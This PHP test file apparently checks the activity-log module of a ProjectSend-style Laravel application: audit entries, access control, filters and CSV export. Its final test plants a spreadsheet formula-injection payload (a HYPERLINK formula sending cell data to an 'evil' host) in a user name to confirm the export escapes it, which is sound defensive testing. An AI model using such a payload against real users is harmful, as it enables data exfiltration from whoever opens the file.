<?php

declare(strict_types=1);

use App\Models\User;
use App\Modules\Audit\Action;
use App\Modules\Audit\ActivityLog;
use App\Modules\Identity\Models\Role;
use App\Modules\Identity\Permissions\SystemRole;
use Inertia\Testing\AssertableInertia;
use PragmaRX\Google2FA\Google2FA;

test('completing setup records installation and account creation', function () {
    $this->post('/setup', [
        'site_name' => 'ProjectSend',
        'name' => 'Admin',
        'email' => 'admin@example.com',
        'password' => 'super-secret-password',
        'password_confirmation' => 'super-secret-password',
    ]);

    $setup = ActivityLog::query()->where('action', Action::SetupCompleted)->sole();
    expect($setup->actor_name)->toBe('Admin');

    $created = ActivityLog::query()->where('action', Action::UserCreated)->sole();
    expect($created->subject_name)->toBe('Admin');
});

test('the projectsend:admin command records a system-actor entry', function () {
    $this->artisan('projectsend:admin', [
        '--name' => 'CLI Admin',
        '--email' => 'cli@example.com',
        '--password' => 'super-secret-password',
    ]);

    $entry = ActivityLog::query()->where('action', Action::UserCreated)->sole();
    expect($entry->actor_id)->toBeNull()
        ->and($entry->actor_name)->toBeNull()
        ->and($entry->subject_name)->toBe('CLI Admin');
});

test('login and logout are recorded', function () {
    $user = User::factory()->create();

    $this->post('/login', ['email' => $user->email, 'password' => 'password']);
    $this->post('/logout');

    expect(ActivityLog::query()->where('action', Action::Login)->where('actor_id', $user->id)->exists())->toBeTrue()
        ->and(ActivityLog::query()->where('action', Action::Logout)->where('actor_id', $user->id)->exists())->toBeTrue();
});

test('settings changes are recorded with their section', function () {
    $this->actingAs(User::factory()->create());

    $this->patch('/system/settings/general', ['site_name' => 'Renamed']);
    // The security section saves as a whole, like every other settings
    // section, so all of its fields go with the request.
    $this->patch('/system/settings/security', [
        'two_factor_enforcement' => 'staff',
        'password_min_length' => 12,
        'password_reject_breached' => true,
    ]);

    $entries = ActivityLog::query()->where('action', Action::SettingsUpdated)->get();

    expect($entries)->toHaveCount(2)
        ->and($entries->pluck('context.section')->all())->toContain('general', 'security');
});

test('two-factor lifecycle is recorded', function () {
    $user = User::factory()->create();

    // The two-factor mutation routes sit behind password.confirm.
    $this->actingAs($user)->post('/confirm-password', ['password' => 'password']);

    $this->actingAs($user)->post('/settings/two-factor');
    $code = app(Google2FA::class)->getCurrentOtp((string) $user->refresh()->two_factor_secret);
    $this->actingAs($user)->post('/settings/two-factor/confirm', ['code' => $code]);
    $this->actingAs($user)->post('/settings/two-factor/recovery-codes');
    $this->actingAs($user)->delete('/settings/two-factor');

    foreach ([Action::TwoFactorEnabled, Action::TwoFactorRecoveryCodesRegenerated, Action::TwoFactorDisabled] as $action) {
        expect(ActivityLog::query()->where('action', $action)->where('actor_id', $user->id)->exists())
            ->toBeTrue($action->value.' should be logged');
    }
});

test('disabling 2fa that was never enabled logs nothing', function () {
    $user = User::factory()->create();

    $this->actingAs($user)->delete('/settings/two-factor');

    expect(ActivityLog::query()->where('action', Action::TwoFactorDisabled)->exists())->toBeFalse();
});

test('profile and password updates are recorded', function () {
    $user = User::factory()->create();

    $this->actingAs($user)->patch('/settings/profile', ['name' => 'New Name', 'email' => $user->email]);
    $this->actingAs($user)->put('/settings/password', [
        'current_password' => 'password',
        'password' => 'a-brand-new-password',
        'password_confirmation' => 'a-brand-new-password',
    ]);

    expect(ActivityLog::query()->where('action', Action::ProfileUpdated)->exists())->toBeTrue()
        ->and(ActivityLog::query()->where('action', Action::PasswordUpdated)->exists())->toBeTrue();
});

test('log entries survive actor deletion via the name snapshot', function () {
    $user = User::factory()->create(['name' => 'Ephemeral User']);

    $this->post('/login', ['email' => $user->email, 'password' => 'password']);

    // Soft delete: the reference stays intact.
    $user->delete();
    $entry = ActivityLog::query()->where('action', Action::Login)->sole();
    expect($entry->actor_id)->toBe($user->id)
        ->and($entry->actor_name)->toBe('Ephemeral User');

    // Permanent delete: the FK nulls, the snapshot keeps the name.
    $user->forceDelete();
    $entry->refresh();
    expect($entry->actor_id)->toBeNull()
        ->and($entry->actor_name)->toBe('Ephemeral User');
});

test('staff can view the activity log page', function () {
    $user = User::factory()->create();

    $this->post('/login', ['email' => $user->email, 'password' => 'password']);

    $this->get('/activity')->assertInertia(
        fn (AssertableInertia $page) => $page
            ->component('activity/index')
            ->has('entries', 1)
            ->where('entries.0.action', 'auth.login')
            ->where('entries.0.actor_name', $user->name),
    );
});

test('log entries link to still-existing objects the viewer may open', function () {
    $admin = User::factory()->create();
    $client = User::factory()->client()->create();

    $this->post('/login', ['email' => $admin->email, 'password' => 'password']);
    $this->actingAs($admin)->post('/roles', ['name' => 'Linked Role', 'permissions' => []]);
    $this->actingAs($admin)->patch("/clients/{$client->id}", [
        'name' => $client->name, 'email' => $client->email, 'active' => true,
    ]);

    $role = Role::query()->where('name', 'Linked Role')->sole();

    $response = $this->actingAs($admin)->get('/activity');

    $response->assertInertia(
        fn (AssertableInertia $page) => $page
            // Newest first: client update -> subject links to the client.
            ->where('entries.0.subject_url', "/clients/{$client->id}")
            ->where('entries.0.actor_url', "/users/{$admin->id}")
            // Role creation -> subject links to the role.
            ->where('entries.1.subject_url', "/roles/{$role->id}"),
    );
});

test('links vanish when the object is gone or the viewer lacks access', function () {
    $admin = User::factory()->create();
    $deleted = User::factory()->client()->create(['name' => 'Gone Client']);

    $this->actingAs($admin)->patch("/clients/{$deleted->id}", [
        'name' => $deleted->name, 'email' => $deleted->email, 'active' => true,
    ]);
    $deleted->delete();

    // Subject deleted: sentence keeps the name, but no link.
    $this->actingAs($admin)->get('/activity')->assertInertia(
        fn (AssertableInertia $page) => $page
            ->where('entries.0.subject_url', null)
            ->where('entries.0.replacements.subject', 'Gone Client'),
    );

    // An uploader can read the log but lacks edit permissions: no links.
    $uploader = User::factory()->role(SystemRole::Uploader)->create();
    $this->actingAs($uploader)->get('/activity')->assertInertia(
        fn (AssertableInertia $page) => $page
            ->where('entries', fn ($entries) => collect($entries)
                ->every(fn ($entry) => $entry['actor_url'] === null && $entry['subject_url'] === null)),
    );
});

test('clients cannot view the activity log', function () {
    User::factory()->create();

    $this->actingAs(User::factory()->client()->create());

    // Client navigation to staff URLs is sent home, not errored.
    $this->get('/activity')->assertRedirect(route('dashboard'));
    $this->get('/activity/export')->assertRedirect(route('dashboard'));
});

test('the log can be filtered by action, account type, name, and date range', function () {
    $staff = User::factory()->create(['name' => 'Filter Admin']);
    $client = User::factory()->client()->create(['name' => 'Filter Client']);

    $this->post('/login', ['email' => $staff->email, 'password' => 'password']);
    $this->post('/logout');
    $this->post('/login', ['email' => $client->email, 'password' => 'password']);
    $this->post('/logout');
    $this->artisan('projectsend:admin', [
        '--name' => 'CLI Admin', '--email' => 'cli@example.com', '--password' => 'super-secret-password',
    ]);

    $this->actingAs($staff);

    // By action: only logins.
    $this->get('/activity?action=auth.login')->assertInertia(
        fn (AssertableInertia $page) => $page->has('entries', 2)
            ->where('entries.0.action', 'auth.login'),
    );

    // By account type: client actions only.
    $this->get('/activity?actor_type=client')->assertInertia(
        fn (AssertableInertia $page) => $page
            ->where('entries', fn ($entries) => collect($entries)->every(fn ($entry) => $entry['actor_name'] === 'Filter Client')),
    );

    // System actor (the CLI-created account entry).
    $this->get('/activity?actor_type=system')->assertInertia(
        fn (AssertableInertia $page) => $page->has('entries', 1)
            ->where('entries.0.actor_name', null),
    );

    // By account name search.
    $this->get('/activity?actor=Filter Client')->assertInertia(
        fn (AssertableInertia $page) => $page
            ->where('entries', fn ($entries) => collect($entries)->isNotEmpty()
                && collect($entries)->every(fn ($entry) => $entry['actor_name'] === 'Filter Client')),
    );

    // Date range excluding everything.
    $this->get('/activity?from=2000-01-01&to=2000-01-02')->assertInertia(
        fn (AssertableInertia $page) => $page->has('entries', 0),
    );

    // Invalid filter values are rejected.
    $this->from('/activity')->get('/activity?action=not.a.real.action')->assertRedirect('/activity');
});

test('the csv export streams the filtered log', function () {
    $staff = User::factory()->create(['name' => 'Export Admin']);

    $this->post('/login', ['email' => $staff->email, 'password' => 'password']);

    $response = $this->actingAs($staff)->get('/activity/export?action=auth.login');

    $response->assertOk();
    expect($response->headers->get('content-disposition'))->toContain('activity-log-');

    $csv = $response->streamedContent();
    expect($csv)->toContain('Date,Account,"Account type",Origin,"API token",Action,Description,Subject,Details')
        ->and($csv)->toContain('auth.login')
        ->and($csv)->toContain('Export Admin')
        ->and($csv)->not->toContain('setup.completed');
});

// Half the columns carry names their subject chose — a self-registering
// client picks their own — and they land in a file an admin opens in a
// spreadsheet.
test('the csv export neutralises spreadsheet formulas in attacker-chosen names', function () {
    $staff = User::factory()->create(['name' => '=HYPERLINK("http://evil/?"&A1,"click")']);

    $this->post('/login', ['email' => $staff->email, 'password' => 'password']);

    $csv = $this->actingAs($staff)->get('/activity/export?action=auth.login')->streamedContent();

    expect($csv)->toContain('\'=HYPERLINK')
        ->and($csv)->not->toContain(',=HYPERLINK')
        ->and($csv)->not->toContain('"=HYPERLINK');
});
